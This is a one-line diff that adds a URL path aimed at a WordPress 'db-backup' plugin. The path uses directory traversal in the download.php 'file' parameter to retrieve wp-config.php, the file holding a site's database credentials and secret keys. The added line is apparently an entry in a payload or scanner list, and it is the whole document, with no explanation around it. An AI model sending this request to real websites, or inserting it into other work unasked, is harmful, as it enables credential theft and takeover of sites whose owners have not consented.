@@ -1,0 +1,1 @@
+/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
